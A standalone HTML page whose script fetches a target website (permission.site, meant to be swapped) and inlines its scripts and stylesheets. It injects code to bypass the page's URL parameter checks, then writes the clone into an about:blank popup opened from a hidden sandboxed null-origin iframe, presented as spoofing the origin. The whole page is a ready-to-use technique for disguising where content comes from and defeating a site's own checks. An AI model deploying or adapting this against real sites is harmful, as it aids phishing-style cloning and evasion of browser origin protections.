<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Open about:blank Popup with Spoofed Origin</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        padding: 20px;
      }
    </style>
  </head>
  <body>
    <button onclick="openSpoofedPopup()">Open Popup (Spoof Origin)</button>
    <script>
      async function fetchAndInlineResources(baseUrl, html) {
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        
        // Inline stylesheets
        const styleLinks = doc.querySelectorAll('link[rel="stylesheet"]');
        for (const link of styleLinks) {
          const href = new URL(link.href, baseUrl).href;
          try {
            const response = await fetch(href);
            if (response.ok) {
              const css = await response.text();
              const style = doc.createElement('style');
              style.textContent = css;
              link.replaceWith(style);
            }
          } catch (e) {
            console.warn(`Failed to inline stylesheet ${href}: ${e}`);
          }
        }
        
        // Inline scripts
        const scripts = doc.querySelectorAll('script[src]');
        for (const script of scripts) {
          const src = new URL(script.src, baseUrl).href;
          try {
            const response = await fetch(src);
            if (response.ok) {
              const js = await response.text();
              const inlineScript = doc.createElement('script');
              inlineScript.textContent = js;
              script.replaceWith(inlineScript);
            }
          } catch (e) {
            console.warn(`Failed to inline script ${src}: ${e}`);
          }
        }
        
        return doc.documentElement.outerHTML;
      }

      async function openSpoofedPopup() {
        const targetUrl = "https://permission.site"; // ganti sesuai kebutuhan
        let html;
        try {
          const response = await fetch(targetUrl);
          if (!response.ok) throw new Error(`HTTP ${response.status}`);
          html = await response.text();
          
          // Inline all resources
          html = await fetchAndInlineResources(targetUrl, html);
          
          // Hack to bypass URL param checks
          html = html.replace(
            /<head>/i,
            `<head>
              <script>
                const originalURLSearchParams = URLSearchParams;
                URLSearchParams = function(...args) {
                  const params = new originalURLSearchParams(...args);
                  if (params.get('typeId') === null) params.set('typeId', 'default');
                  if (params.get('itemId') === null) params.set('itemId', 'default');
                  return params;
                };
                window.addEventListener('load', () => {
                  if (typeof initialize === 'function') initialize();
                });
              <\/script>`
          );
          
          // Add fullscreen style
          html = html.replace(
            /<\/head>/i,
            `<style>
              body, html { margin:0; padding:0; height:100%; overflow:hidden; background:#000; }
            </style>
            </head>`
          );
          
          console.log("✅ Fetched and prepped HTML");
        } catch (error) {
          console.warn("⚠️ Fetch gagal:", error.message);
          // Fallback: No HTML prep, use direct src in popup
          html = null;
        }

        // Create null-origin sandboxed iframe to open popup from
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        iframe.sandbox = 'allow-scripts allow-popups'; // Null origin, allow open popup

        // Srcdoc with script to receive HTML via postMessage and inject into popup
        iframe.srcdoc = `
          <script>
            window.addEventListener('message', (event) => {
              if (event.data.type === 'injectHtml') {
                const win = window.open(
                  'about:blank',
                  '_blank',
                  'width=800,height=600,left=200,top=100,resizable=yes,scrollbars=yes'
                );
                if (!win) {
                  console.error('Popup blocked');
                  return;
                }
                if (event.data.html) {
                  // Inject fetched HTML
                  win.document.open();
                  win.document.write(event.data.html);
                  win.document.close();
                } else {
                  // Fallback: Redirect to targetUrl
                  win.location.href = '${targetUrl}';
                }
                console.log('✅ Popup opened from null-origin iframe with spoofed origin');
              }
            });
          <\/script>
        `;

        // Wait for iframe load, then postMessage the HTML
        iframe.onload = () => {
          iframe.contentWindow.postMessage({ type: 'injectHtml', html }, '*');
          // Clean up iframe after
          setTimeout(() => document.body.removeChild(iframe), 1000);
        };
      }
    </script>
  </body>
</html>
